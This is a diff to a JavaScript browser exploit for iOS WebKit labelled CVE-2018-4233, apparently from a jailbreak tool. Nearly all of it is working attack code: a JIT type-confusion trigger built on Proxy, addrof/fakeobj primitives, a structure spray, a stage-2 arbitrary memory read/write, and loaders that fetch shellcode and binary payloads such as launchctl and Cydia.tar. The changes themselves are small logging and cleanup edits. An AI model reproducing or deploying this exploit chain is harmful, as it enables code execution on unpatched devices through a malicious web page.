@@ -61,7 +61,7 @@ var f64 = new Float64Array(conversion_buffer); //QWORD
 var i32 = new Uint32Array(conversion_buffer); //DWORD
 
 /* configuration options */
-verbosity = VERBOSITY_DEFAULT; //we only want most important stuff to be displayed
+verbosity = VERBOSITY_VERBOSE; //we only want most important stuff to be displayed
 print = alert; //override the default print function with the alert function so we get a popup
 ITERS = TEN*THOUSAND;
 ALLOCS = THOUSAND;
@@ -76,11 +76,11 @@ function has_offsets() {
 }
 
     //Hex conversion
-    function hex(x) {
-            if( x < 0)
-                return eval(`-${hex(-x)}`); //Hex may never be negative so we conver the integer to a positive value
-            return eval(`0x${x.toString(16)}`); //Convert the number to a hexadecimal
-    }
+function hex(x) {
+    if (x < 0)
+        return `-${hex(-x)}`;
+    return `0x${x.toString(16)}`;
+}
 
 //Float to Integer conversion
 function f2i(f) {
@@ -136,37 +136,34 @@ function load_binary_resource(url) {
  *
  */
 
-try{
-    // CVE-2018-4233
-    function trigger(constr, modify, res, val) {
-        return eval(`
-            var o = [13.37];
-            var Constructor${counter} = function(o) { ${constr} };
-            var hack = false;
-            var Wrapper = new Proxy(Constructor${counter}, {
-                get: function() {
-                    if (hack) {
-                        ${modify}
-                    }
+// CVE-2018-4233
+function trigger(constr, modify, res, val) {
+    return eval(`
+        var o = [13.37];
+        var Constructor${counter} = function(o) { ${constr} };
+        var hack = false;
+        var Wrapper = new Proxy(Constructor${counter}, {
+            get: function() {
+                if (hack) {
+                    ${modify}
                 }
-            });
-            for (var i = 0; i < ITERS; ++i)
-                new Wrapper(o)
-            hack = true
-            var bar = new Wrapper(o)
-            ${res}
-        `);
-    }
-} catch(ex) {
-    //older devices dont support this syntax, thats why
+            }
+        });
+        for (var i = 0; i < ITERS; ++i)
+            new Wrapper(o)
+        hack = true
+        var bar = new Wrapper(o)
+        ${res}
+    `);
 }
+
 var pwn = function() {
     var _off = window.chosendevice.offsets;
     console.log('Starting stage 1...');
-    
+    alert('Stage 1 started!');
     var stage1 = {
-        addroff: function(victim) {
-            return f2i(trigger('this.result = o[0]', 'o[0] = val', 'bar.result', victim));
+        addrof: function(victim) {
+            return f2i(trigger('this.result = o[0]', 'o[0] = val', 'bar.result', victim))
         },
         
         fakeobj: function(addr) {
@@ -196,7 +193,7 @@ var pwn = function() {
     var manager = structure_spray[500];
     var leak_addr = stage1.addrof(manager); //Trigger the infoleak, we can read the address of any structure!
     
-    if(verbosity === VERBOSITY_HIGH) print('leaking from '+hex(leak_addr));
+    if(verbosity >= VERBOSITY_HIGH) print('leaking from '+hex(leak_addr));
     
     //function for allocating above
     function alloc_above_manager(expr) {
@@ -279,8 +276,8 @@ var pwn = function() {
     //Alright, this is where we get full r/w to memory
     var stage2 = {
         addrof: function(victim) {
-            boxed[0] = victim;
-            return f2i(unboxed[0]);
+            boxed[0] = victim
+            return f2i(unboxed[0])
         },
         
         fakeobj: function(addr) {
@@ -446,7 +443,7 @@ var wk113go = function() {
                 print('Received '+shellcode_length+ ' bytes of shellcode. Exploit will start now.');
                 pwn();
             } catch(exception) {
-                print_error(exception); //We do not want our script to fail, so we catch all exceptions if they occur and continue
+                document.write(exception); //We do not want our script to fail, so we catch all exceptions if they occur and continue
             }
         });
     });
@@ -562,7 +559,7 @@ var wk113go = function() {
               
     function wk91sploit(){
         console.log("going");
-        puts("Running stage 1 exploit");
+        document.write("Running stage 1 exploit");
         setTimeout(go_, 100);
     }
               
@@ -700,7 +697,7 @@ var wk113go = function() {
                     mem0 = stale[0];
                     mem2 = smsh;
                     if (smsh.length != 0x10) {
-                        puts("Running stage 2 exploit");
+                        document.write("Running stage 2 exploit");
                         setTimeout(function () {
                              smashed(stale,payload_tar_ptr,payload_cydia_ptr,payload_launchctl_ptr,payload_offsets_ptr);
                          }, 100);
@@ -715,7 +712,7 @@ var wk113go = function() {
     }
     
     function wk91go(){
-        console.log("Downloading resources"); puts("Downloading Resources");
+        console.log("Downloading resources"); document.write("Downloading Resources");
         setTimeout(function () {
 
             //Start downloading all of the resources.
@@ -724,7 +721,7 @@ var wk113go = function() {
             payload_launchctl = getArrFromResource(load_binary_resource("payloads/91_934_32/launchctl"))
             payload_offsets = getArrFromResource(load_binary_resource("payloads/91_934_32/offsets.json"))
             
-            console.log("Downloading Cydia"); puts("Downloading Cydia");
+            console.log("Downloading Cydia"); document.write("Downloading Cydia");
             
             setTimeout(function () {
                 payload_cydia = getArrFromResource(load_binary_resource("payloads/91_934_32/Cydia.tar"))
